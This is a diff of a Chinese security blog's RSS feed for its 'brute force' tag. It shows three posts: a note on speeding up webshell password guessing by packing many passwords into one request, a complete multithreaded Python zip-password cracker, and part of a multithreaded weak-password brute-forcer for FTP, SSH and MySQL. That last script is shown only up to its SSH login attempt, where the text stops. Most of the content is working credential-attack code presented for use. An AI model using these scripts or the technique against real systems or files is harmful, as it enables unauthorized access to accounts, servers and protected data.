@@ -1,33 +1,384 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>爆破 on Reber&#39;s Blog</title>
-    <link>https://wyb0.com/tags/%E7%88%86%E7%A0%B4/</link>
-    <description>Recent content in 爆破 on Reber&#39;s Blog</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <lastBuildDate>Fri, 17 Feb 2017 10:32:24 +0000</lastBuildDate>
-    <atom:link href="https://wyb0.com/tags/%E7%88%86%E7%A0%B4/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>利用多参数提高 webshell 爆破速度</title>
-      <link>https://wyb0.com/posts/2017/multi-parameter-blasting-webshell/</link>
-      <pubDate>Fri, 17 Feb 2017 10:32:24 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2017/multi-parameter-blasting-webshell/</guid>
-      <description>0x00 原理 之前在https://www.t00ls.net/viewthread.php?tid=36985看到这个思路的。</description>
-    </item>
-    <item>
-      <title>Python 爆破 zip 压缩包</title>
-      <link>https://wyb0.com/posts/2016/python-blasting-zip-archive/</link>
-      <pubDate>Tue, 20 Sep 2016 14:50:59 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2016/python-blasting-zip-archive/</guid>
-      <description>0x00 代码 多线程爆破加密的zip压缩包 #!/usr/bin/env python # -*- coding: utf-8 -*- import sys import optparse import zipfile import threading import Queue queue = Queue.Queue() lock = threading.Lock() result = &amp;#39;&amp;#39; def load_pwd(filename): for line in open(filename,&amp;#39;r&amp;#39;): if line: queue.put(line.strip()) def bruter(zipname,queue): global result zFile = zipfile.ZipFile(zipname) while</description>
-    </item>
-    <item>
-      <title>Python 实现多线程弱口令爆破</title>
-      <link>https://wyb0.com/posts/2016/python-multi-threaded-weak-password-blasting/</link>
-      <pubDate>Fri, 26 Aug 2016 17:53:51 +0000</pubDate>
-      <guid>https://wyb0.com/posts/2016/python-multi-threaded-weak-password-blasting/</guid>
-      <description>0x00 脚本 #!/usr/bin/env python # -*- coding: utf-8 -*- &amp;#39;this script can bruter ftp/ssh/mysql&amp;#39; __author__ = &amp;#39;reber&amp;#39; import Queue import threading import time import logging import socket from optparse import OptionParser import paramiko from ftplib import FTP import MySQLdb #################公有类</description>
-    </item>
-  </channel>
-</rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>爆破 on Reber's Blog</title><link>https://wyb0.com/tags/%E7%88%86%E7%A0%B4/</link><description>Recent content in 爆破 on Reber's Blog</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Fri, 17 Feb 2017 10:32:24 +0000</lastBuildDate><atom:link href="https://wyb0.com/tags/%E7%88%86%E7%A0%B4/index.xml" rel="self" type="application/rss+xml"/><item><title>利用多参数提高 webshell 爆破速度</title><link>https://wyb0.com/posts/2017/multi-parameter-blasting-webshell/</link><pubDate>Fri, 17 Feb 2017 10:32:24 +0000</pubDate><guid>https://wyb0.com/posts/2017/multi-parameter-blasting-webshell/</guid><description>&lt;h3 id="0x00-原理">0x00 原理&lt;/h3>
+&lt;p>之前在&lt;a href="https://www.t00ls.net/viewthread.php?tid=36985">https://www.t00ls.net/viewthread.php?tid=36985&lt;/a>看到这个思路的。&lt;/p>
+&lt;p>Apache下默认同时允许接收1000个参数；IIS下默认同时允许接收5883个参数，可以一次提交多个密码，从而快速爆破。&lt;/p></description></item><item><title>Python 爆破 zip 压缩包</title><link>https://wyb0.com/posts/2016/python-blasting-zip-archive/</link><pubDate>Tue, 20 Sep 2016 14:50:59 +0000</pubDate><guid>https://wyb0.com/posts/2016/python-blasting-zip-archive/</guid><description>&lt;h3 id="0x00-代码">0x00 代码&lt;/h3>
+&lt;p>多线程爆破加密的zip压缩包&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -*- coding: utf-8 -*-&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> sys
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> optparse
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> zipfile
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> threading
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> Queue
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>queue &lt;span style="color:#f92672">=&lt;/span> Queue&lt;span style="color:#f92672">.&lt;/span>Queue()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lock &lt;span style="color:#f92672">=&lt;/span> threading&lt;span style="color:#f92672">.&lt;/span>Lock()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">load_pwd&lt;/span>(filename):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> line &lt;span style="color:#f92672">in&lt;/span> open(filename,&lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> line:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> queue&lt;span style="color:#f92672">.&lt;/span>put(line&lt;span style="color:#f92672">.&lt;/span>strip())
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">bruter&lt;/span>(zipname,queue):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">global&lt;/span> result
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> zFile &lt;span style="color:#f92672">=&lt;/span> zipfile&lt;span style="color:#f92672">.&lt;/span>ZipFile(zipname)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> queue&lt;span style="color:#f92672">.&lt;/span>empty():
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> password &lt;span style="color:#f92672">=&lt;/span> queue&lt;span style="color:#f92672">.&lt;/span>get()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> zFile&lt;span style="color:#f92672">.&lt;/span>extractall(pwd&lt;span style="color:#f92672">=&lt;/span>password) &lt;span style="color:#75715e"># 解压&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lock&lt;span style="color:#f92672">.&lt;/span>acquire()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;[Ok] password is: &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> password
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lock&lt;span style="color:#f92672">.&lt;/span>release()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> password
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lock&lt;span style="color:#f92672">.&lt;/span>acquire()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;[Error] password not is: &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> password
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lock&lt;span style="color:#f92672">.&lt;/span>release()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> queue&lt;span style="color:#f92672">.&lt;/span>task_done()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser &lt;span style="color:#f92672">=&lt;/span> optparse&lt;span style="color:#f92672">.&lt;/span>OptionParser()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-f&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;--file&amp;#39;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;zipfile&amp;#39;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> type&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;string&amp;#39;&lt;/span>, help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Target zip file.&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-p&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;--pfile&amp;#39;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;pwdfile&amp;#39;&lt;/span>,default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;pass.txt&amp;#39;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> type&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;string&amp;#39;&lt;/span>, help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Password file.&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-t&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;--thread_num&amp;#39;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;thread_num&amp;#39;&lt;/span>,default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">60&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> type&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;int&amp;#39;&lt;/span>, help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Thread number.&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (options, args) &lt;span style="color:#f92672">=&lt;/span> parser&lt;span style="color:#f92672">.&lt;/span>parse_args()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>zipfile &lt;span style="color:#f92672">and&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>pwdfile:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> load_pwd(options&lt;span style="color:#f92672">.&lt;/span>pwdfile)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>print_help()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sys&lt;span style="color:#f92672">.&lt;/span>exit(&lt;span style="color:#ae81ff">0&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threads &lt;span style="color:#f92672">=&lt;/span> []
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> range(options&lt;span style="color:#f92672">.&lt;/span>thread_num):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">=&lt;/span> threading&lt;span style="color:#f92672">.&lt;/span>Thread(target&lt;span style="color:#f92672">=&lt;/span>bruter,args&lt;span style="color:#f92672">=&lt;/span>(options&lt;span style="color:#f92672">.&lt;/span>zipfile,queue,))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>setDaemon(&lt;span style="color:#66d9ef">True&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>start()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> queue&lt;span style="color:#f92672">.&lt;/span>join()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;result is: &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> result
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;__main__&amp;#39;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> main()
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Python 实现多线程弱口令爆破</title><link>https://wyb0.com/posts/2016/python-multi-threaded-weak-password-blasting/</link><pubDate>Fri, 26 Aug 2016 17:53:51 +0000</pubDate><guid>https://wyb0.com/posts/2016/python-multi-threaded-weak-password-blasting/</guid><description>&lt;h3 id="0x00-脚本">0x00 脚本&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -*- coding: utf-8 -*-&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;this script can bruter ftp/ssh/mysql&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>__author__ &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;reber&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> Queue
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> threading
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> time
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> logging
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> socket
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> optparse &lt;span style="color:#f92672">import&lt;/span> OptionParser
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> paramiko
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> ftplib &lt;span style="color:#f92672">import&lt;/span> FTP
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> MySQLdb
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#################公有类#################&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">CommonFun&lt;/span>(object):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;docstring for CommonFun&amp;#34;&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> super(CommonFun, self)&lt;span style="color:#f92672">.&lt;/span>__init__()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">set_log&lt;/span>(self,lname):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> logger &lt;span style="color:#f92672">=&lt;/span> logging&lt;span style="color:#f92672">.&lt;/span>getLogger(lname)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> logger&lt;span style="color:#f92672">.&lt;/span>setLevel(logging&lt;span style="color:#f92672">.&lt;/span>DEBUG)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ch &lt;span style="color:#f92672">=&lt;/span> logging&lt;span style="color:#f92672">.&lt;/span>StreamHandler()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ch&lt;span style="color:#f92672">.&lt;/span>setLevel(logging&lt;span style="color:#f92672">.&lt;/span>DEBUG)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> formatter &lt;span style="color:#f92672">=&lt;/span> logging&lt;span style="color:#f92672">.&lt;/span>Formatter(&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">%(asctime)s&lt;/span>&lt;span style="color:#e6db74"> - &lt;/span>&lt;span style="color:#e6db74">%(name)s&lt;/span>&lt;span style="color:#e6db74"> - &lt;/span>&lt;span style="color:#e6db74">%(levelname)s&lt;/span>&lt;span style="color:#e6db74"> - &lt;/span>&lt;span style="color:#e6db74">%(message)s&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ch&lt;span style="color:#f92672">.&lt;/span>setFormatter(formatter)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> logger&lt;span style="color:#f92672">.&lt;/span>addHandler(ch)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">show_log&lt;/span>(self, lname, msg):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a &lt;span style="color:#f92672">=&lt;/span> logging&lt;span style="color:#f92672">.&lt;/span>getLogger(lname)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a&lt;span style="color:#f92672">.&lt;/span>debug(msg)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">show_result&lt;/span>(self, lname, rlist):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> rlist:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;###################################################################&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> rlist:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(lname,x)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;not found...&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#################SSH爆破模块#################&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SshBruter&lt;/span>(CommonFun):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;docstring for SshBruter&amp;#34;&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self, &lt;span style="color:#f92672">*&lt;/span>args):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> super(SshBruter, self)&lt;span style="color:#f92672">.&lt;/span>__init__()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (options,arg) &lt;span style="color:#f92672">=&lt;/span> args
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>host &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>host
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>userfile &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>userfile
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>passfile &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>passfile
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>threadnum &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>threadnum
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>timeout &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>timeout
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>result &lt;span style="color:#f92672">=&lt;/span> []
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>set_log(self&lt;span style="color:#f92672">.&lt;/span>host)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist &lt;span style="color:#f92672">=&lt;/span> Queue&lt;span style="color:#f92672">.&lt;/span>Queue()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>is_exit &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">False&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print self&lt;span style="color:#f92672">.&lt;/span>host,self&lt;span style="color:#f92672">.&lt;/span>userfile,self&lt;span style="color:#f92672">.&lt;/span>passfile,self&lt;span style="color:#f92672">.&lt;/span>threadnum
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">get_queue&lt;/span>(self):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> open(self&lt;span style="color:#f92672">.&lt;/span>userfile, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ulines &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>readlines()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> open(self&lt;span style="color:#f92672">.&lt;/span>passfile, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> plines &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>readlines()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> name &lt;span style="color:#f92672">in&lt;/span> ulines:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> pwd &lt;span style="color:#f92672">in&lt;/span> plines:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name &lt;span style="color:#f92672">=&lt;/span> name&lt;span style="color:#f92672">.&lt;/span>strip()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pwd &lt;span style="color:#f92672">=&lt;/span> pwd&lt;span style="color:#f92672">.&lt;/span>strip()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>put(name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> pwd)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">thread&lt;/span>(self): 
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>empty():
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>is_exit:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name,pwd &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>get()&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssh &lt;span style="color:#f92672">=&lt;/span> paramiko&lt;span style="color:#f92672">.&lt;/span>SSHClient()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssh&lt;span style="color:#f92672">.&lt;/span>set_missing_host_key_policy(paramiko&lt;span style="color:#f92672">.&lt;/span>AutoAddPolicy())
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssh&lt;span style="color:#f92672">.&lt;/span>connect(hostname&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>host,port&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">22&lt;/span>,username&lt;span style="color:#f92672">=&lt;/span>name,password&lt;span style="color:#f92672">=&lt;/span>pwd,timeout&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>timeout)
